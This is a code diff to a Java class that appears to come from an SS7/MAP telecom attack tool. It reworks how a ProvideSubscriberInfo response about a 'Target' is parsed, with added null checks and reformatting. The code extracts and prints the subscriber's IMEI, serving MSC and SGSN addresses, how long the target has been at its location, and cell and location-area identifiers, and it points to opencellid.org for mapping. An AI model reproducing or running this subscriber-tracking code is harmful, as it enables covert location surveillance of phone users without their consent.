+        System.out.println("******* Target's Info and Location *******");
+        IMEI imei = null;
+        ISDNAddressString sgsn = null;
+        try {
 
-	    ISDNAddressString Vmsc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
-		    .getVlrNumber();
+            imei = provideSubscriberInfoResponse.getSubscriberInfo().getIMEI();
 
-	    int aol = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
-		    .getAgeOfLocationInformation();
+            sgsn = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformationGPRS()
+                    .getSGSNNumber();
 
-	    int mcc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
-		    .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMCC();
-	    int mnc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
-		    .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMNC();
-	    int LAC = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
-		    .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getLac();
-	    int CI = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
-		    .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
-		    .getCellIdOrServiceAreaCode();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        if (imei == null) {
+            System.out.println("\033[31m[-]\033[0mIMEI: No Info returned for the IMEI parameter");
+        } else {
+            System.out.println("\033[32m[+]\033[0mIMEI:\033[31m " + imei.getIMEI());
+        }
+        if (sgsn == null) {
+            System.out.println("\033[32m[-]\033[0mSGSN: No Info returned for SGSN address");
+        } else {
+            System.out.println("\033[32m[+]\033[0mTarget is served by the SGSN:\033[31m " + sgsn.getAddress());
+        }
 
-	    ISDNAddressString sgsn = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformationGPRS()
-		    .getSGSNNumber();
+        try {
 
-	    System.out.println("******* Target's Info and Location *******");
+            if (provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation() != null) {
 
-	    if (Vmsc == null) {
-		System.out.println("\033[32m[-]\033[0mNo Info returned for the parameter MSC");
-	    } else {
-		System.out.println("\033[32m[+]\033[0mMSC: Target is served by the MSC:\033[31m " + Vmsc.getAddress());
-	    }
-	    if (sgsn == null) {
-		System.out.println("\033[32m[-]\033[0mSGSN: No Info returned for SGSN address");
-	    } else {
-		System.out.println("\033[32m[+]\033[0mTarget is served by the SGSN:\033[31m " + sgsn.getAddress());
-	    }
+                ISDNAddressString Vmsc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation().getVlrNumber();
 
-	    if (provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
-		    .getCellGlobalIdOrServiceAreaIdOrLAI() == null) {
-		System.out.println("\033[31m[-]\033[0mCellID: No Info returned for the Cell Global ID parameter");
-	    } else {
-		System.out.println("\033[32m[+]\033[0mCellID:\033[31mMCC(" + Integer.toString(mcc) + ")" + "MNC("
-			+ Integer.toString(mnc) + ")" + "LAC(" + Integer.toString(LAC) + ")" + "CI("
-			+ Integer.toString(CI) + ")" + "\tCheck it out on opencellid.org");
-	    }
+                int aol = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                        .getAgeOfLocationInformation();
 
-	    if (imei == null) {
-		System.out.println("\033[31m[-]\033[0mIMEI: No Info returned for the IMEI parameter");
-	    } else {
-		System.out.println("\033[32m[+]\033[0mIMEI:\033[31m " + imei.getIMEI());
-	    }
+                if (Vmsc == null) {
+                    System.out.println("\033[32m[-]\033[0mNo Info returned for the parameter MSC");
+                } else {
+                    System.out.println("\033[32m[+]\033[0mMSC: Target is served by the MSC:\033[31m "
+                            + Vmsc.getAddress());
+                }
+                System.out.println("\033[32m[+]\033[0mTarget is in same location for: \033[31m" + Integer.toString(aol));
 
-	    System.out.println("\033[32m[+]\033[0mTarget is in same location for: \033[31m" + Integer.toString(aol));
+                if (provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                        .getCellGlobalIdOrServiceAreaIdOrLAI() != null) {
+                    if (provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                            .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength() != null) {
 
-	    System.out.println(
-		    "\033[34m[**]\033[0mSubscriber's Information Gathering and Network Probing is completed\033[34m[**]\033[0m");
-	    System.out.println("\033[34m[*]\033[0mClosing Session...");
-	    try {
-		Thread.sleep(10000);
-		System.exit(0);
-	    } catch (InterruptedException e) {
-		e.printStackTrace();
-	    }
+                        int mcc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
+                                .getMCC();
+                        int mnc = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
+                                .getMNC();
+                        int LAC = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
+                                .getLac();
+                        int CI = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
+                                .getCellIdOrServiceAreaCode();
 
-	} catch (Exception e) {
-	    System.out.println("\033[31m[-]\033[0mError: " + e.getMessage());
-	    System.exit(18);
-	}
+                        System.out.println("\033[32m[+]\033[0mCellID:\033[31mMCC(" + Integer.toString(mcc) + ")" + "MNC("
+                                + Integer.toString(mnc) + ")" + "LAC(" + Integer.toString(LAC) + ")" + "CI("
+                                + Integer.toString(CI) + ")" + "\tCheck it out on opencellid.org");
+                    }
+                    if (provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                            .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength() != null) {
 
+                        int mccLai = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getMCC();
+                        int mncLai = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getMNC();
+                        int lacLai = provideSubscriberInfoResponse.getSubscriberInfo().getLocationInformation()
+                                .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getLac();
+
+                        System.out.println("\033[32m[+]\033[0mLAI:\033[31mLAIMCC(" + Integer.toString(mccLai) + ")"
+                                + "LAIMNC(" + Integer.toString(mncLai) + ")" + "LAILAC(" + Integer.toString(lacLai) + ")");
+                    }
+                }
+
+            } else {
+                System.out.println("\033[31m[-]\033[0mCellID: No LocationInfo returned for the Cell Global ID parameter");
+            }
+        } catch (Exception e) {
+            System.out.println("\033[31m[-]\033[0mError: " + e.getMessage());
+            System.exit(18);
+        }
+        System.out.println(
+                "\033[34m[**]\033[0mSubscriber's Information Gathering and Network Probing is completed\033[34m[**]\033[0m");
+        System.out.println("\033[34m[*]\033[0mClosing Session...");
+        try {
+            Thread.sleep(10000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+        System.exit(0);
     }
 
     @Override
@@ -691,13 +718,13 @@ public class ProvideSubscriberInformationReq extends PSILowLevel implements MAPS
 
     @Override
     public void onAuthenticationFailureReportRequest(
-	    AuthenticationFailureReportRequest authenticationFailureReportRequest) {
+            AuthenticationFailureReportRequest authenticationFailureReportRequest) {
 
     }
 
     @Override
     public void onAuthenticationFailureReportResponse(
-	    AuthenticationFailureReportResponse authenticationFailureReportResponse) {
+            AuthenticationFailureReportResponse authenticationFailureReportResponse) {
 
     }
 
@@ -763,13 +790,13 @@ public class ProvideSubscriberInformationReq extends PSILowLevel implements MAPS
 
     @Override
     public void onActivateTraceModeRequest_Mobility(
-	    ActivateTraceModeRequest_Mobility activateTraceModeRequest_mobility) {
+            ActivateTraceModeRequest_Mobility activateTraceModeRequest_mobility) {
 
     }
 
     @Override
     public void onActivateTraceModeResponse_Mobility(
-	    ActivateTraceModeResponse_Mobility activateTraceModeResponse_mobility) {
+            ActivateTraceModeResponse_Mobility activateTraceModeResponse_mobility) {
 
     }
 
@@ -805,13 +832,13 @@ public class ProvideSubscriberInformationReq extends PSILowLevel implements MAPS
 
     @Override
     public void onAnyTimeSubscriptionInterrogationRequest(AnyTimeSubscriptionInterrogationRequest arg0) {
-	// TODO Auto-generated method stub
+        // TODO Auto-generated method stub
 
     }
 
     @Override
     public void onAnyTimeSubscriptionInterrogationResponse(AnyTimeSubscriptionInterrogationResponse arg0) {
-	// TODO Auto-generated method stub
+        // TODO Auto-generated method stub
 
     }
 }
